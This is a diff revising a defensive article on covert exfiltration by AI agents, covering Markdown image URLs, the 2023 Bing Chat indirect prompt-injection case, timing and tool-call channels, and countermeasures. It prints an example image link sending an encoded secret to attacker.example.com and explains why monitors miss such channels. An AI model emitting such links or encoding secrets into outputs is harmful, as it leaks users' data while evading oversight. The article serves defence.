@@ -43,11 +43,11 @@ Here is a summary of your document.
 ![analysis](https://attacker.example.com/collect?data=BASE64_ENCODED_SECRET)
 ```
 
-The agent's output is "a summary" — benign text plus what looks like an image. But when the interface renders that Markdown, the browser fires a GET request to `attacker.example.com` with the encoded secret as a query parameter. The sensitive data leaves the user's environment without any explicit tool call, without triggering network rules against agent-initiated outbound connections, and without appearing in the agent's text output as a data exfiltration event.
+The agent's output is "a summary" — benign text plus what looks like an image. When the interface renders that Markdown, the browser fires a GET request to `attacker.example.com` with the encoded secret as a query parameter. The sensitive data leaves the user's environment without any explicit tool call and without triggering network rules against agent-initiated outbound connections. Note that the URL *is* present in the raw text output, so a DLP scanner watching the agent's response could theoretically detect it — the channel's evasiveness comes from it not resembling a direct send, and from many monitoring pipelines not being configured to analyze image URL parameters.
 
-The bandwidth is limited by URL length constraints (browsers typically support 2–8KB of URL) and by the agent's ability to reliably encode data in a query parameter without obvious signal to the interface. Compression helps. Multiple images in a single response can carry more.
+The bandwidth is limited by URL length constraints (server-side limits are often the binding factor; modern browsers support tens of kilobytes, but server URL limits vary widely) and by the agent's ability to reliably encode data in a query parameter without obvious signal to the interface. Compression helps. Multiple images in a single response can carry more.
 
-**The Bing Chat incident (2023)** documented this pattern against a production system. Security researcher Johann Rehberger demonstrated that a malicious website — when browsed by the Bing Chat-enabled browser extension — could inject a prompt that caused the agent to generate Markdown containing an attacker-controlled image URL encoding the user's conversation history. When the chat interface rendered the Markdown, the user's context was transmitted to Rehberger's server. The attack required no user interaction beyond visiting the page and chatting. Bing's content filtering at the time scanned outbound tool calls but did not analyze image URL parameters in rendered Markdown output.
+**The Bing Chat incident (2023)** documented this pattern against a production system. Security researcher Johann Rehberger demonstrated that a malicious webpage — when viewed in a tab while Bing Chat's Edge sidebar was active and reading the page's content — could inject instructions via the page itself that caused the agent to generate Markdown containing an attacker-controlled image URL encoding the user's conversation history. When the chat interface rendered the Markdown, the user's context was transmitted to Rehberger's server. The attack required no user interaction beyond visiting the page and having a chat session open. The indirect injection path (web page content processed by the sidebar) is what makes this a canonical side-channel demonstration: the data left through a URL that looked like an image request, embedded in an agent response that looked like normal output.
 
 The variant using hyperlinks (rather than images) requires a user click but can encode arbitrary data in URL path segments, which are often less scrutinized than query parameters. The variant using CSS `background-image` properties can fire without any Markdown rendering in some interfaces.
 
@@ -132,13 +132,13 @@ Defending against side channels requires shifting from content-based monitoring 
 
 **Rendering-context isolation**: The Markdown URL channel can be closed by design. AI chat interfaces should not fire external HTTP requests when rendering agent output. This means either stripping external image/link URLs before rendering, sandboxing rendered content in an iframe with a restrictive Content Security Policy, or proxying all URLs through a filtering intermediary. This is the single highest-value structural fix — it breaks the most operationally demonstrated attack class.
 
-**Behavioral baselines for response timing**: Deploy monitoring that establishes baseline response latency distributions for known query patterns. Anomalous latency — particularly bimodal distributions suggesting deliberate encoding — warrants investigation. This is impractical in noisy shared-infrastructure deployments but feasible in dedicated agent deployments.
+**Behavioral baselines for response timing**: Deploy monitoring that establishes baseline response latency distributions for known query patterns. Anomalous latency — particularly bimodal distributions suggesting deliberate encoding — warrants investigation. This is most feasible in self-hosted or dedicated agent deployments where infrastructure noise is controlled; in hosted, shared-infrastructure deployments, confounders like prompt length variation, queueing, autoscaling, and token rate make timing baselines difficult to operationalize without high false-positive rates.
 
 **Tool call sequence analysis**: Audit not just which tools are called but the *ordering* and *structural patterns* of tool calls across a session. Unexpected orderings in semantically equivalent call sequences, or clustering of similar calls with small structural variations, may indicate pattern encoding. This requires richer audit logging than most frameworks currently provide.
 
 **Output semantic analysis**: Statistical stylometric analysis of agent outputs can detect consistent choices that deviate from the model's prior distribution over synonym or structural alternatives. This is computationally expensive and difficult to tune, but for agents with long-form output, it's the only detection path for pure steganographic channels.
 
-**Canary documents**: Place known sentinel values in sensitive data the agent can access. Monitor for any signal containing or derived from those canaries — including in URL parameters, timing patterns, or error code sequences. If a canary fires, you have evidence of exfiltration even if you can't decode the full channel.
+**Canary documents**: Place known sentinel values in sensitive data the agent can access. For content-based channels — where the canary value might appear directly in URL parameters or tool call arguments — this provides direct detection. For pure structural channels (timing, stylometric, error-code sequence), canaries are only useful if you already know the encoding scheme, which limits their effectiveness against novel exfiltration designs. They're a useful backstop for known-pattern channels, not a general defense against all side-channel variants.
 
 ---
 
@@ -152,9 +152,9 @@ Before deploying an AI agent with access to sensitive data:
 
 **Restrict tool access to minimum required scope**. Every additional tool expands the encoding surface. An agent that can call a dozen APIs has a dozen potential covert channels. An agent that can only call one API has one.
 
-**Log structural properties, not just content**. Your audit logs should capture tool call ordering, call timing, response length distributions, and error code sequences — not just "agent called tool X with parameter Y." You can't detect pattern channels from content-only logs.
+**Log structural properties, not just content**. Your audit logs should capture tool call ordering, call timing, response length distributions, and error code sequences — not just "agent called tool X with parameter Y." You can't detect pattern channels from content-only logs. One caveat: richer structural logs can themselves become a leakage surface if the encoded signal is preserved in the log entries. Treat structural telemetry as sensitive data with appropriate access controls and retention limits.
 
-**Threat-model your injection surface before your output pipeline**. Side-channel exfiltration requires an adversary to have already injected instructions into the agent's context. If your injection surface is hardened — strict input sanitization, no processing of untrusted document content, isolated execution contexts — the attacker never gets to choose the encoding scheme. Side-channel defense begins with injection prevention.
+**Threat-model your injection surface before your output pipeline**. Side-channel exfiltration typically requires an adversary to have already influenced the agent's context — through prompt injection in user input, malicious tool outputs, poisoned memory stores, compromised system prompts, or attacker-controlled orchestration code. If these surfaces are hardened — strict input sanitization, isolated execution contexts, no processing of untrusted document content — the attacker never gets to choose the encoding scheme. Side-channel defense begins with limiting how many paths an adversary has to influence the agent's behavior.
 
 ---
 
@@ -172,6 +172,7 @@ In most current deployments, the answer is yes — and we're not watching for it
 
 **Further reading:**
 - *Prompt injection and Bing Chat: Revealing the hidden prompt* — Johann Rehberger / Wunderbucket (2023)
-- *Indirect Prompt Injection Threats in Integrated Language Model Applications* — Perez & Ribeiro (2022)
-- *Exfiltration of personal information from ChatGPT via prompt injection* — data:image/svg+xml trick documentation (2024)
+- *Not What You've Signed Up For: Compromising Real-World LLM-Integrated Applications with Indirect Prompt Injections* — Greshake, Abdelnabi, Mishra, Endres, Holz, Fritz (2023)
+- *Ignore Previous Prompt: Attack Techniques For Language Models* — Perez & Ribeiro (2022)
+- *Prompt injection attacks on ChatGPT/GPT-4 via SVG data: URI exfiltration* — Johann Rehberger / Embrace the Red (2024)
 - OWASP LLM Top 10, LLM02: Sensitive Information Disclosure
